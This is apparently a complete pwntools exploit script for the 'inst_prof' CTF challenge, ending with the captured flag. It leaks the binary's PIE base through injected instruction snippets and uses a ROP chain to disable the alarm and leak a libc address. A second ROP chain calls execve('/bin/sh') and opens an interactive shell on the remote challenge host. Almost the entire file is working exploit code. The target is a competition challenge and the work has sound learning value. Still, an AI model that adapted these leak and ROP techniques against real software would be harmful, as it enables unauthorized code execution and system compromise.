#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
    libc = ELF('libc6_2.19-0ubuntu6.11_amd64.so')
else:
    DEBUG = True
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

b = ELF('inst_prof')
context.log_level = 'info'
context.arch = 'amd64'

###

if DEBUG:
    r = process('./inst_prof', aslr=False)
else:
    r = remote('inst-prof.ctfcompetition.com', 1337)

GDB = False
if GDB and DEBUG:
    gdb.attach(r) #, 'b *0x555555554b16')

log.info('sleep timer...')
time.sleep(5)
log.info('sleep timer ended')
r.recv(26)

# first part we leak binary PIE
r.send(asm('pop r14\npush r14'))
p = asm('dec r14\nret') * (0xb18 - 0x8a2)
r.send(p)
r.clean()
r.send(asm('push rsp\npop rsi\npush r14'))

d = r.recv(4096 * 4096)
l = d[len(d) - 6:len(d)] + '\x00\x00'
l = u64(l)
basebinary = l - 0x8a2
log.info('leak: %#x' % l)
log.info('basebinary: %#x' % basebinary)

if DEBUG and GDB:
    pause()
# make ROP great again
r.send(asm('push rsp\npop r14\nret'))
r.send(asm('inc r14\nret') * 0x38) # increase rsp to [saved RIP + 8]
r.clean()

RDI = 0x0000000000000bc3 # pop rdi ; ret
RSI = 0x0000000000000bc1 # pop rsi ; pop r15 ; ret

ROP  = p64(basebinary + RDI)
ROP += p64(0) # disable alarm
ROP += p64(basebinary + b.plt['alarm'])
ROP += p64(basebinary + RDI)
ROP += p64(1) # fd
ROP += p64(basebinary + RSI)
ROP += p64(basebinary + b.got['write'])
ROP += p64(0)
ROP += p64(basebinary + b.plt['write'])
ROP += p64(basebinary + 0x8C7) # main loop again

for x in ROP:
    r.send(asm('movb [r14], %#x' % ord(x)))
    r.send(asm('inc r14\nret'))

time.sleep(1) # be sure to receive all data before flushing
r.clean() # flush

# trigger ROP with pop rax ; pop rdx ; push rax ; ret
if DEBUG and GDB:
    pause()
r.send(asm('pop rax\npop rdx\npush rax\nret'))
d = ''
while len(d) < 0x10:
    d += r.recv(1)
d = d[8:0x10]
l = u64(d)
libcbase = l - libc.symbols['write']
log.info('leak: %#x' % l)
log.info('libcbase: %#x' % libcbase)

# now ROP stage 2
r.send(asm('push rsp\npop r14\nret'))
r.send(asm('inc r14\nret') * 0x38) # increase rsp to [saved RIP + 8]
r.clean()

ROP  = p64(basebinary + RDI)
ROP += p64(libcbase + libc.search('/bin/sh').next())
ROP += p64(basebinary + RSI)
ROP += p64(0) # rsi
ROP += p64(0) # r15
ROP += p64(libcbase + libc.search(asm('pop rdx\nret')).next())
ROP += p64(0) # rdx
ROP += p64(libcbase + libc.symbols['execve'])
ROP += p64(basebinary + RDI)
ROP += p64(0)
ROP += p64(libcbase + libc.symbols['_exit']) # don't crash :p

for x in ROP:
    r.send(asm('movb [r14], %#x' % ord(x)))
    r.send(asm('inc r14\nret'))

# trigger
log.info('trying to get shell in 1 second...')
r.send(asm('pop rax\npop rdx\npush rax\nret'))
time.sleep(1)
r.clean()

r.interactive()
r.close()

# CTF{0v3r_4ND_0v3r_4ND_0v3r_4ND_0v3r}
